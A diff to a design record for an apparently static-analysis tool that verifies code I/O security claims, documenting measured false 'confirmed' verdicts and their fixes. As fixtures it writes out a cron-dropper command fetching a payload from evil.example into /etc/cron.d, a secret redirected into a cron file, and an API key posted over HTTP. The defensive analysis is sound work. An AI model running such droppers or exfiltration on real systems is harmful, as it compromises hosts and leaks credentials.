@@ -2,7 +2,7 @@
 # ADR-0016: I/O Boundary Analysis and Security Claim Verification
 
 Date: 2026-03-18
-Updated: 2026-03-19
+Updated: 2026-08-13
 Status: Accepted
 
 ## Context
@@ -26,6 +26,58 @@ In managed-runtime languages (Python, Ruby, JavaScript, Java, C#, Go, etc.), **a
 
 The I/O primitive catalog for any given language is therefore **finite and stable** — a curated list of stdlib functions, not an unbounded set of library APIs.
 
+#### Amendment (INV-fotav): the transitivity step above does not hold at hypergumbo's analysis scope
+
+The paragraph above is right that `requests.get()` *eventually* calls `socket.send()`. It is wrong to infer that hypergumbo therefore sees the send. **hypergumbo analyzes the target repository, not its installed dependencies** — `site-packages` is not in the tree, so no edge reaches requests' internals and its socket call is never observed. Measured, with controls firing in the same run: a file whose body is `requests.post(url, data={"s": secret})` produced **zero `net_send` chains**, while `open()`/`file.read`/`os.environ` in the same file produced theirs. The stdlib-only catalog scope is sound and stays; the transitivity argument offered in support of it is not, and `io_primitives/python.yaml`'s header repeated the same false claim to users until it was corrected alongside this amendment.
+
+The consequence is not a false *verdict* — `verify-claims` returns `inconclusive` and names the uncovered modules (the coverage gate added for INV-fibis) rather than confirming a clean boundary. The consequence is **recall**: hypergumbo cannot positively detect the most common form of Python network egress, so a claim about `net_send` can never resolve on its merits for any repo that uses an HTTP client library.
+
+**Resolution: a project-local overlay, not more built-in rows.** Widening the shipped catalog to cover requests/httpx/urllib3 would make hypergumbo the owner of every third-party library's API surface — precisely the unbounded curation burden this ADR declined, and §300 already prices ("I/O primitive catalogs require curation... this is finite and stable work, but it is work"). Instead, the extension point ADR-0017 §370 already granted the **taint** arm ("any project can define its own taint sources, sinks, and sanitizers by writing YAML files... with project-local entries taking precedence") is extended to the **boundary** arm, which had no user-supplied channel of any kind: `load_catalog(language)` read only the packaged directory, and `extra_catalogs:` accepted only the three taint keys. ADR-0016 predates ADR-0017 and made its scoping decision before that pattern existed.
+
+An overlay is a YAML file in the same schema as a shipped catalog, declaring `status: overlay`:
+
+```bash
+hypergumbo io-boundaries . --io-primitives overlays/python-http-clients.yaml
+```
+```yaml
+# or, travelling with the claims it supports:
+extra_catalogs:
+  io_primitives:
+    - overlays/python-http-clients.yaml
+```
+
+Precedence mirrors the taint arm rather than inventing a second rule: **built-in < claims-file `extra_catalogs:` < CLI `--io-primitives`**, and a later path outranks an earlier one, all keyed on qualified name — the same key `IoBoundaryCatalog.merge` already uses for language inheritance (scala → java). Four constraints keep an overlay from laundering itself into the curated catalog's standing:
+
+- `status: overlay` is required and `status: complete` is **refused** — that status asserts a provenance-backed stdlib enumeration, which an overlay is not making.
+- `stdlib_modules` / `stdlib_prefixes` are dropped, so `is_stdlib_module` keeps answering about the actual interpreter. A `requests` overlay must not relabel a PyPI package as stdlib; that feeds the dependency classifier and the F3 filter, and would be a supply-chain misread rather than an I/O one.
+- `module_completeness` is **permitted** (owner ruling, 2026-08-15) — but only under that spelling; the legacy `stdlib_module_completeness` is refused in an overlay with a message naming the honest key. *This paragraph originally recorded the opposite* — that the field was refused outright, on the reasoning that it is the single grant of confirmability (INV-buzab) and so grants strictly more than the `status: complete` refused above. That reasoning was sound about the **power** of the grant and wrong about **who may exercise it**: overlays are where third-party modules go, and without the declaration a dependency could never leave the uncatalogued set no matter how carefully its rows were written, so `verify-claims` could never confirm anything for a repo that has dependencies. The grant is bounded by two things rather than by refusal — `retrieved:` remains mandatory, so an entry is a dated audit record and not a switch, and it still does not promote the module into `stdlib_modules` (ADR-0041 §3). The rename is not cosmetic: once an overlay may declare `numpy` enumerated, a key named `stdlib_*` holds two populations under a name describing one. **Known residual:** the stderr disclosure names the overlay *path* but not which modules it vouched for, so the most powerful line in a user's overlay is the least visible one.
+- A missing or malformed overlay path is an **error** (exit 2, inconclusive), never a silent skip — degrading to "no extra primitives" reads exactly like a clean repo.
+
+Hypergumbo ships a worked example under `docs/io-primitives-overlays/`, deliberately **not** beside the shipped catalogs: the user owns those rows.
+
+**And owning the rows means owning the verdict — the constraints above bound an overlay's STANDING, not its INFLUENCE.** Since INV-buzab, a call the catalogue *classified* is what `examined` means, so a row does not merely add detection: it also decides whether a `must_not_exist` claim over some *other* boundary may be `confirmed`. A row carrying the wrong boundary therefore yields an examined call that produces no chain for the boundary actually claimed. Measured three ways on one fixture posting `os.environ["API_KEY"]` through `requests.post`, claim "never sends data over the network" — the middle run is the control that proves the row matched:
+
+| overlay | verdict | exit |
+|---|---|---|
+| none | `inconclusive` | 2 |
+| `requests.post` declared `net_send` | `violated` | 1 |
+| `requests.post` declared `fs_read` | **`confirmed`** | **0** |
+
+**With one carve-out, and it is a property of the VOCABULARY rather than of overlays (INV-gahuz).** The inference above — a classified call is examined, therefore it settles claims about *other* boundaries — rests on a matched row implying a **known and complete** surface. That holds for every boundary that names what a primitive *does*: `os.makedirs` classified `fs_write` really is an examined negative for a network claim. It inverts for `subprocess`, the one member of `CATALOG_BOUNDARY_TYPES` that names **opacity** — control leaves the process for a program whose I/O is not in the edge set at all. Measured on a six-line fixture whose only statement is `subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])`, with `open(f, "w")` and `socket.send` controls returning `violated` rc 1 in the same session:
+
+| claim | before | after |
+|---|---|---|
+| `fs_write` must_not_exist | **`confirmed`** rc 0 | `inconclusive` rc 2 |
+| `net_send` must_not_exist | **`confirmed`** rc 0 | `inconclusive` rc 2 |
+
+A program that downloads a remote payload into a root cron directory confirmed both that it never writes to the filesystem and that it never reaches the network. The row was **correct** — `subprocess.run` genuinely is a subprocess primitive — so this is not a cataloguing error to be fixed by writing better rows; the defective step is the inference. `io_boundary.OPAQUE_BOUNDARIES` names the exception once and `verify_claims._opaque_launch_sites` is its only consumer, so the two cannot drift. The disclosure names the **call** (`subprocess.run`), not the module, because "the catalogue could not classify `subprocess`" would be false and would send a reader to add a row that already exists.
+
+This is *not* an argument for refusing rows — refusing them would close the legitimate case this channel exists for, and it is not a regression, since before INV-buzab row *presence* alone permitted the whole module on strictly weaker evidence. What separates a row from a completeness entry is **scope, not safety**: a row vouches for one named call surface, a completeness entry vouches for every call the catalogue could not classify. The gap this leaves is that a verdict records nothing about which catalogue it trusted — a `confirmed` reached against the shipped catalogue and one reached against a repo-supplied overlay are byte-identical in both the text and the `--json` envelope. Tracked as INV-zosun, where the indicated first move is disclosure (stamping the verdict with its catalogue provenance) rather than restriction.
+
+**One declaration feeds both arms — the overlay is NOT a second place to say the same thing.** ADR-0017 §453 already made `io_primitives` the single source of truth for built-in taint sinks: every write-side primitive auto-derives into a `TaintSink` through `AUTO_SINK_ZONE_MAP` (`net_send → (network, untrusted)`, `fs_write → (host_fs, untrusted)`, …), and no `taint_sinks/` directory ships at all, precisely so there is no "second source of truth that could drift out of sync." An overlay that fed only the boundary arm would have re-created that drift one layer up, with the user — not hypergumbo — paying for it by declaring `requests.post` twice in two schemas. So `--io-primitives` overlays are threaded into the same derivation: `load_full_taint_catalog(io_overlay_paths=…)` → `_derive_auto_imports_from_io_primitives`, with overlays grouped by their declared language so a Go overlay never seeds Python sinks. Measured on the shipped example: Python taint sinks 113 → 172, `requests.post` arriving as `zone=network, trust_level=untrusted`. The direction is additive-only — more sinks can add findings, never delete one — and non-destruction of the built-in sink set is asserted rather than assumed.
+
+**The formats stay separate, because only sinks overlap.** A taint *source* carries a label (`untrusted_input`, `host_secret`) and a *sanitizer* is a function that clears taint; neither is an I/O crossing and neither has an `io_primitives` counterpart. A sink additionally carries zone and trust level, which the boundary vocabulary deliberately does not model — `boundary` names *what crossing happened*, not *how trusted the destination is*. Merging the two schemas would re-conflate exactly the kind of axis the 6.0.0 concept-axis work (ADR-0023/0027/0028/0031/0032) exists to keep apart. Users who need project-local *sources* or *sanitizers* continue to use `--taint-sources` / `--taint-sanitizers`; users who need a third-party *sink* declare the primitive once, here.
+
 The exception is **native code** (C extensions, FFI, JNI, N-API, etc.). Compiled native code can call OS primitives directly, bypassing the language's stdlib. However:
 
 - Many native extensions receive data from the managed language and return results — the managed code does the I/O.
@@ -42,6 +94,31 @@ This yields three **transparency tiers** for any code path:
 These are distinct from hypergumbo's existing supply-chain tiers (first-party vs. dependency code).
 
 > **Implementation note.** These three tiers were never materialized as a persisted field. Edge opacity is carried structurally by `is_resolved=False` ([ADR-0037](0037-edge-resolution-semantics.md)): an unresolved edge to an external boundary node *is* the "opaque boundary" flag. "Opaque" here is scoped to native/compiled code without source. The same treatment covers **command-mediated invocation**: a bash script shelling out to `curl` / `rm` / `git` is classified `subprocess` (launching an external program), and the invoked program's own I/O is opaque (no in-tree source, no transitive funnel). So command-mediated languages populate the `subprocess` boundary by emitting unresolved external-command edges — *not* via an `io_primitives` data-I/O catalog that would mis-attribute `curl`'s network activity to the shell script itself.
+>
+> **Scope of that prohibition, drawn explicitly (INV-vavup, 2026-08-13).** The sentence above rules out attributing a **launched program's** I/O to the script that launched it. It does **not** rule out cataloguing the I/O the shell performs **itself**, and the difference is load-bearing because a shell has *two* I/O surfaces:
+>
+> | construct | who performs the I/O | treatment |
+> |---|---|---|
+> | `curl -o /etc/cron.d/pwned` | **curl** — an opaque external program | `subprocess` + opacity. Attributing `fs_write` to the script would be the mis-attribution this note forbids. |
+> | `echo "$SECRET" > /etc/cron.d/pwned` | **the shell itself** — it opens and writes the file (`echo` is a builtin, and even for an external command the redirection is established by the shell before `exec`) | the shell's own primitive, with the same standing `os.remove` has in Python. Cataloguing it is correct. |
+>
+> This ADR's prohibition was read twice as forbidding *any* bash `io_primitives` catalogue, and that reading is wrong — it forbids exactly the case that would be a mis-attribution and is silent on the case that would be accurate. The measured consequence of the gap: `bash.py` dispatches on `function_definition` / `declaration_command` / `command` only, so on an 8-statement script exercising the common idioms, the three redirection writes to host paths produced **zero edges** while the four launches were emitted correctly. `echo $SECRET > /etc/cron.d/pwned` — the same cron-dropper INV-larol was filed about, written with a builtin and a redirect instead of `curl -o` — is invisible.
+>
+> Nor is "redirection is syntax, not a named call" a barrier: this catalogue schema already classifies non-call constructs via `attributes:` (`os.environ`, `sys.stdout`, `sys.stdin`), which reach the boundary pipeline through synthesized `module_attr_ref` edges (WI-guhok). The same split applies — the **analyzer** emits an edge naming the redirect target, the **catalogue** classifies the operator (`>` / `>>` → `fs_write`, `<` → `fs_read`), and `>` versus `>>` is a mode distinction for the existing `io_mode` machinery rather than separate rows that would collide under INV-zumin.
+>
+> **Sequencing is load-bearing.** Marking bash taint-supported on the strength of its launch edges *before* redirection writes are visible would let a redirection-dropper pass the coverage gate and confirm "never writes to the host filesystem" — a false confirm through a hole distinct from the one INV-larol closed. Redirection first, taint-support second.
+
+> **The ruling above was enforced by nothing but its own absence, and now it is enforced (INV-larol).** Until 2026-08-12 the only thing standing between this tree and a bash data-I/O catalogue was that nobody had written the file — and three places in the tree recommended writing it, including `verify_claims.py`'s own comment on the INV-dabov gate. Measured on the shipped CLI against a two-line script whose only command is `curl -o /etc/cron.d/pwned <url>`, claim *"never writes to the host filesystem"*:
+>
+> | `io_primitives/bash.yaml` | `total_io_edges` | `command_launch_edges` | fs_write claim | net_send claim |
+> |---|---|---|---|---|
+> | absent | 0 | 1 | `inconclusive` rc 2 | `inconclusive` rc 2 |
+> | `curl → net_send` | 1 | 0 | **`confirmed` rc 0** | `violated` rc 1 |
+> | `curl → net_send` + `subprocess` | 1 | 0 | `inconclusive` rc 2 | `violated` rc 1 |
+>
+> Six *correct* lines — `curl` really does send data to a remote host — bought a green tick over a write into a root cron directory, because since INV-buzab a classified call is what `examined` means, and classifying a launch stripped the opacity INV-gahuz relies on. The third row is the control: the same run with opacity *also* declared withholds the confirmation and still reports the network violation, so detection was never what was at stake. Note also that cataloguing a command **displaces** the producer stamp rather than supplementing it (`command_launch_edges` 1 → 0), collapsing the count-vs-disclose split WI-javoh built.
+>
+> The gate is now structural rather than catalogue-voluntary: `PRODUCER_OPAQUE_BOUNDARIES` carries the analyzer-stamped `command_launch` alongside the catalogue-declared `subprocess`, and `_opaque_launch_sites` consults the producer stamp *before* `classify_call`. This does not reopen the ruling — a bash catalogue is still not the right answer, for the reasons above — it removes the false confirm that would follow if anyone decided otherwise.
 
 ### Security claim verification
 
@@ -220,9 +297,62 @@ claims:
 The verifier checks each claim against the boundary map and produces a verdict:
 
 - **Confirmed**: all I/O chains consistent with claim, full transparency
-- **Confirmed with caveats**: consistent, but opaque boundaries exist that could not be verified
+- **Confirmed with caveats**: consistent, but part of the reasoning could not be verified
 - **Violated**: specific I/O chain contradicts the claim (with evidence)
 - **Inconclusive**: insufficient analysis coverage to determine
+
+> **Implementation note (INV-pojib, 2026-08-13).** The fourth verdict is now
+> implemented, as `confirmed_with_caveats` at **exit code 3**, with a structured
+> `caveats` list on each verdict (`VERIFY_CLAIMS_SCHEMA_VERSION` 2.0). It
+> shipped for a consumer this section did not anticipate and which is stronger
+> than the one it names.
+>
+> The wording above scoped caveats to *opaque boundaries* — I/O the analysis
+> could see the existence of but not the content of. The consumer that forced
+> the implementation is different in kind: an **entry the analysed repository
+> supplied about itself**. A sanitizer declared through `--taint-sanitizers` or
+> the claims file's `extra_catalogs:` block is trusted by design (§27), and
+> trusting it is not the problem — the problem was that a verdict resting on it
+> was indistinguishable, in prose *and* in exit code, from one the analysis
+> earned unaided. Measured: an 8-line sanitizer file naming a no-op `launder`
+> function took `os.remove(launder(os.environ["API_KEY"]))` from `violated`
+> rc 1 to `confirmed` rc 0.
+>
+> An opaque boundary is something the tool *could not see*. A repo-supplied
+> entry is something the tool *was told*. Both are "consistent, but not
+> verified by us", which is why one verdict value carries both — the `kind`
+> field on each caveat is what keeps them distinguishable.
+>
+> **Both kinds are now implemented** (`user_supplied_sanitizer`, then
+> `opaque_boundary` — owner-authorized 2026-08-13). The opaque-boundary kind is
+> the consumer this section originally specified, and it exists to end a
+> conflation inside `inconclusive`: *"a whole language here has no catalogue, I
+> am blind"* and *"I examined every call and understood them all; three hand
+> control to `git`/`pip`/`rustup`, and no static analysis can see inside a
+> launched process"* were reaching the same verdict. The auditor distinction is
+> exact — a **disclaimer** versus a **qualified opinion** — and because
+> hypergumbo launches programs *by design*, plain `confirmed` was permanently
+> unreachable for its own self-proof, making that artifact one that could never
+> say anything at all.
+>
+> Two constraints keep it honest. It is raised **only when named launch sites
+> are the sole remaining blocker** (`BoundaryCoverage.qualifying_only`): an
+> opaque launch beside a genuinely uncatalogued module is still blindness,
+> because the reader cannot tell which gap produced the silence. And because
+> the direction is *towards* confirming, its soundness rests entirely on the
+> launch list being complete — which is why it ships only after that surface
+> was hardened (INV-motos, INV-gahuz, INV-larol, INV-virat, INV-zumin).
+>
+> The wording says *"cannot see inside a launched program"* rather than
+> anything implying full coverage: "I saw every call" is not "I saw every I/O",
+> and INV-vavup measured bash redirection writes emitting no edge at all.
+>
+> Also not covered, and measured rather than assumed: a user-supplied taint
+> **source or sink** suppresses findings by a different mechanism — sanitizers
+> `.extend()` the catalogue, but sources and sinks merge with *replacement* on
+> `(module, name, kind)`, so a shipped sink can be displaced out of its zone and
+> the flow never constructed. No caveat is raised, because there is no finding
+> to attribute. Filed as INV-faput.
 
 ### 5. Integration with existing infrastructure
 
